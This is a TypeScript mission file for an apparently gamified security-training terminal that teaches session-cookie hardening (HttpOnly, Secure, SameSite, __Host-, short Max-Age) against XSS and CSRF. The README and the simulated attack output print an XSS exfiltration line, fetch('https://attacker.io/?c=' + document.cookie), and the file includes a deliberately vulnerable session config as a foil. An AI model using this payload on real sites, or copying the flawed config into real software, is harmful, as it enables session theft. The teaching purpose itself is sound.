// Mission M-021 — "Session cookies have no flags. They're being stolen by XSS."
//
// Track: Auth & Identity
// Scenario: Hodlberg AG's session cookie is set without HttpOnly, Secure, or SameSite.
// A bug report shows stored XSS on the profile page can read document.cookie and
// exfiltrate the session token. Additionally, CSRF attacks are possible because
// SameSite=None lets cross-origin requests carry the cookie.
//
// Pedagogy:
//   - HttpOnly: JS cannot read the cookie → XSS cannot steal it
//   - Secure: cookie only sent over HTTPS → not leaked on HTTP redirects
//   - SameSite=Strict: not sent on cross-origin requests → no CSRF
//   - __Host- prefix: forces Secure + no Domain attribute + Path=/
//   - Short Max-Age: session expiry limits damage window
//   - sameSite vs CSRF tokens — when you need both

import type { CommandResult, Mission, MissionState } from "../missionEngine"
import { bold, cyan, dim, gold, green, red, resolvePath, yellow } from "../missionEngine"

const VULN_SESSION_CODE = `// VULNERABLE session setup — /app/auth/session.ts
import session from 'express-session'

app.use(session({
  secret: 'hodlberg-session-secret',
  resave: false,
  saveUninitialized: false,
  cookie: {
    // No HttpOnly → JavaScript can read document.cookie
    // No Secure   → sent over HTTP (leaks on redirect)
    // No SameSite → CSRF is trivially possible
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days — too long
  }
}))

// Current cookie header:
// Set-Cookie: hodlberg.sid=abc123; Path=/
// Missing: HttpOnly; Secure; SameSite=Strict
`

const SECURE_SESSION_CODE = `// SECURE session setup — /app/auth/session.ts
import session from 'express-session'
import RedisStore from 'connect-redis'
import { createClient } from 'redis'

const redisClient = createClient({ url: process.env.REDIS_URL })
const store = new RedisStore({ client: redisClient })

app.use(session({
  name: '__Host-hodlberg',      // __Host- prefix: Secure + no Domain + Path=/
  secret: process.env.SESSION_SECRET,  // 256-bit random, from Vault
  resave: false,
  saveUninitialized: false,
  store,                         // server-side storage (not client-side JWT)
  cookie: {
    httpOnly: true,              // JS cannot read → XSS can't steal
    secure: true,                // HTTPS only
    sameSite: 'strict',          // no cross-origin requests carry the cookie
    maxAge: 15 * 60 * 1000,     // 15 min — short lifetime
    path: '/',
  }
}))

// Resulting header:
// Set-Cookie: __Host-hodlberg=...; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=900
`

const README = `Mission M-021 — Session Cookie Security
=========================================

VULNERABILITIES
  Current cookie: Set-Cookie: hodlberg.sid=abc123; Path=/
  Missing flags:
  1. HttpOnly  — JS can read document.cookie → XSS steals session
  2. Secure    — Cookie sent over HTTP → leaks on mixed-content redirect
  3. SameSite  — Cross-origin POST carries cookie → CSRF possible
  4. Max-Age   — 7-day session → enormous exposure window

  XSS proof-of-concept already in the wild:
    fetch('https://attacker.io/?c=' + document.cookie)

OBJECTIVES
  1. Inspect the vulnerable session config
  2. Add HttpOnly flag
  3. Add Secure flag
  4. Set SameSite=Strict
  5. Use __Host- cookie name prefix
  6. Reduce max-age to 15 minutes
  7. Verify XSS attack fails to read cookie

COMMANDS
  cat session.ts         see vulnerable config
  fix httponly           add HttpOnly flag
  fix secure             add Secure flag
  fix samesite           set SameSite=Strict
  fix prefix             use __Host- name prefix
  fix maxage             reduce max-age to 15 min
  attack xss             simulate XSS cookie steal
  audit                  check all flags
`

const initialState: MissionState = {
  cwd: "/app/auth",
  fs: {
    "/app/auth/README":      { content: README,              mode: "ro" },
    "/app/auth/session.ts":  { content: VULN_SESSION_CODE,   mode: "rw" },
    "/app/auth/secure.ts":   { content: SECURE_SESSION_CODE, mode: "ro" },
  },
  env: {
    HTTPONLY:   "no",
    SECURE:     "no",
    SAMESITE:   "no",
    PREFIX:     "no",
    MAXAGE:     "no",
    CODE_READ:  "no",
  },
  goalsMet: [],
  history: [],
}

function allFlagsSet(env: Record<string, string>): boolean {
  return env.HTTPONLY === "yes" && env.SECURE === "yes" && env.SAMESITE === "yes"
}

export const sessionSecurityMission: Mission = {
  slug: "session-security",
  title: "Secure session cookies: HttpOnly, Secure, SameSite, __Host-, short Max-Age",
  brief: "XSS exploit reads document.cookie and exfiltrates the session token. Session cookie is missing HttpOnly, Secure, SameSite. CSRF is also trivially possible. Fix all five.",
  prompt: "dev@hodlberg-api:/app/auth$ ",
  welcome:
    bold(red("╭────────────────────────────────────────────────────────╮")) + "\r\n" +
    bold(red("│ ")) + bold("MISSION M-021 — SESSION COOKIE SECURITY") + bold(red("             │")) + "\r\n" +
    bold(red("╰────────────────────────────────────────────────────────╯")) + "\r\n\r\n" +
    yellow("XSS in the wild: ") + "document.cookie is readable → session token stolen.\r\n" +
    dim("Start: ") + cyan("cat session.ts") + dim("  ·  Simulate: ") + cyan("attack xss") + "\r\n",
  goals: [
    { id: "read",      label: "Inspect the vulnerable session configuration",        hint: "cat session.ts" },
    { id: "httponly",  label: "Add HttpOnly flag — blocks JS access to cookie",      hint: "fix httponly" },
    { id: "secure",    label: "Add Secure flag — HTTPS-only transmission",           hint: "fix secure" },
    { id: "samesite",  label: "Set SameSite=Strict — prevent CSRF",                  hint: "fix samesite" },
    { id: "prefix",    label: "Use __Host- cookie name prefix",                      hint: "fix prefix" },
    { id: "maxage",    label: "Reduce Max-Age to 15 minutes",                        hint: "fix maxage" },
  ],
  success:
    gold("╭────────────────────────────────────────────────────────────╮") + "\r\n" +
    gold("│  🏆  MISSION COMPLETE — SESSION HARDENED                   │") + "\r\n" +
    gold("╰────────────────────────────────────────────────────────────╯") + "\r\n" +
    dim("Defender XP: ") + green("+185") + dim("   HttpOnly+Secure+SameSite set. __Host- prefix. 15-min expiry.") + "\r\n",
  commands: {
    help: () => ({ stdout:
      bold("Commands") + "\r\n" +
      "  " + cyan("cat <file>") + "     inspect file (session.ts | secure.ts | README)\r\n" +
      "  " + cyan("fix httponly") + "   add HttpOnly flag\r\n" +
      "  " + cyan("fix secure") + "     add Secure flag\r\n" +
      "  " + cyan("fix samesite") + "   set SameSite=Strict\r\n" +
      "  " + cyan("fix prefix") + "     use __Host- name prefix\r\n" +
      "  " + cyan("fix maxage") + "     reduce max-age to 15 min\r\n" +
      "  " + cyan("attack xss") + "     simulate XSS cookie theft\r\n" +
      "  " + cyan("audit") + "          check all cookie flags\r\n" +
      "  " + cyan("goals  hint  clear") + "\r\n",
    }),
    pwd: ({ state }) => ({ stdout: state.cwd }),
    cd: ({ state, args }) => ({ statePatch: { cwd: resolvePath(state.cwd, args[0] ?? "/app/auth") }, stdout: "" }),
    ls: ({ state }) => {
      const entries = Object.keys(state.fs).filter((p) => p.startsWith("/app/auth/")).map((p) => p.replace("/app/auth/", ""))
      return { stdout: entries.join("  ") }
    },
    cat: ({ state, args }): CommandResult => {
      if (!args[0]) return { stderr: "cat: missing file" }
      const normalized = args[0].startsWith("/") ? args[0] : resolvePath(state.cwd, args[0])
      const f = state.fs[normalized]
      if (!f) return { stderr: `cat: ${args[0]}: no such file` }
      const env = { ...state.env }
      if (normalized.endsWith("session.ts") && env.CODE_READ === "no") {
        env.CODE_READ = "yes"
        return { stdout: f.content, statePatch: { env }, goalMet: "read" }
      }
      return { stdout: f.content }
    },
    fix: ({ state, args }): CommandResult => {
      const env = { ...state.env }
      if (args[0] === "httponly") {
        if (env.HTTPONLY === "yes") return { stdout: yellow("HttpOnly already set.") }
        env.HTTPONLY = "yes"
        return {
          stdout:
            green("✓ httpOnly: true added.") + "\r\n" +
            dim("  Browsers will refuse to expose this cookie to JavaScript.") + "\r\n" +
            dim("  document.cookie no longer contains the session token.") + "\r\n" +
            dim("  XSS can still use the cookie for requests, but cannot read its value."),
          statePatch: { env },
          goalMet: "httponly",
        }
      }
      if (args[0] === "secure") {
        if (env.SECURE === "yes") return { stdout: yellow("Secure already set.") }
        env.SECURE = "yes"
        return {
          stdout:
            green("✓ secure: true added.") + "\r\n" +
            dim("  Cookie will only be sent over HTTPS connections.") + "\r\n" +
            dim("  HTTP downgrade attacks + mixed-content leaks no longer expose the token."),
          statePatch: { env },
          goalMet: "secure",
        }
      }
      if (args[0] === "samesite") {
        if (env.SAMESITE === "yes") return { stdout: yellow("SameSite already set.") }
        env.SAMESITE = "yes"
        return {
          stdout:
            green("✓ sameSite: 'strict' added.") + "\r\n" +
            dim("  Cookie will not be sent on cross-origin requests.") + "\r\n" +
            dim("  CSRF attacks from attacker.io cannot piggyback on this session.") + "\r\n" +
            yellow("  Tip: SameSite=Lax is a reasonable trade-off for top-level navigation."),
          statePatch: { env },
          goalMet: "samesite",
        }
      }
      if (args[0] === "prefix") {
        if (env.PREFIX === "yes") return { stdout: yellow("__Host- prefix already applied.") }
        if (env.SECURE !== "yes") return { stderr: red("__Host- prefix requires Secure flag. Run: fix secure first.") }
        env.PREFIX = "yes"
        return {
          stdout:
            green("✓ Cookie renamed to __Host-hodlberg.") + "\r\n" +
            dim("  __Host- prefix rules: Secure must be set, no Domain attr, Path must be '/'.") + "\r\n" +
            dim("  Prevents subdomain cookie injection attacks."),
          statePatch: { env },
          goalMet: "prefix",
        }
      }
      if (args[0] === "maxage") {
        if (env.MAXAGE === "yes") return { stdout: yellow("Max-Age already reduced.") }
        env.MAXAGE = "yes"
        return {
          stdout:
            green("✓ maxAge reduced: 7 days → 15 minutes.") + "\r\n" +
            dim("  Stolen session tokens expire after 15 min.") + "\r\n" +
            dim("  Implement refresh token rotation for seamless long-lived sessions."),
          statePatch: { env },
          goalMet: "maxage",
        }
      }
      return { stderr: `fix: unknown target '${args[0]}'` }
    },
    attack: ({ state, args }): CommandResult => {
      if (args[0] !== "xss") return { stderr: "attack: usage: attack xss" }
      const { HTTPONLY } = state.env
      if (HTTPONLY === "yes") {
        return {
          stdout:
            green("Attack BLOCKED:") + "\r\n" +
            dim("  fetch('https://attacker.io/?c=' + document.cookie)") + "\r\n" +
            dim("  Result: document.cookie = '' (HttpOnly cookies are excluded)") + "\r\n" +
            green("  ✓ Session token is no longer accessible to JavaScript."),
        }
      }
      return {
        stdout:
          red("VULNERABLE:") + "\r\n" +
          dim("  document.cookie = 'hodlberg.sid=abc123xyz'") + "\r\n" +
          red("  fetch('https://attacker.io/?c=hodlberg.sid%3Dabc123xyz') → exfiltrated!") + "\r\n" +
          yellow("  Run: fix httponly"),
      }
    },
    audit: ({ state }): CommandResult => {
      const e = state.env
      const checks = [
        { name: "HttpOnly",        ok: e.HTTPONLY === "yes" },
        { name: "Secure",          ok: e.SECURE === "yes" },
        { name: "SameSite=Strict", ok: e.SAMESITE === "yes" },
        { name: "__Host- prefix",  ok: e.PREFIX === "yes" },
        { name: "Max-Age 15 min",  ok: e.MAXAGE === "yes" },
      ]
      const lines = checks.map((c) => (c.ok ? green("  ✓ ") + c.name : red("  ✗ ") + c.name))
      const allOk = checks.every((c) => c.ok)
      return {
        stdout:
          bold("Set-Cookie Flag Audit") + "\r\n" +
          lines.join("\r\n") + "\r\n" +
          (allOk
            ? green("Result: PASS — " + (e.PREFIX === "yes" ? "__Host-hodlberg" : "hodlberg.sid") + "; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=900")
            : yellow(`Result: ${checks.filter((c) => c.ok).length}/5 flags set.`)),
      }
    },
    hint: ({ state }) => {
      const r = sessionSecurityMission.goals.find((g) => !state.goalsMet.includes(g.id))
      return { stdout: r ? dim("→ ") + yellow(r.label) + dim("  (" + (r.hint ?? "") + ")") : green("All goals met.") }
    },
    goals: ({ state }) => ({
      stdout: bold("Goals") + "\r\n" + sessionSecurityMission.goals.map((g) => (state.goalsMet.includes(g.id) ? green("  ✓ ") + dim(g.label) : dim("  · ") + g.label)).join("\r\n"),
    }),
    clear: () => ({ stdout: "\x1b[2J\x1b[H" }),
    exit: () => ({ stdout: dim("— session closed —") }),
  },
  initialState,
}
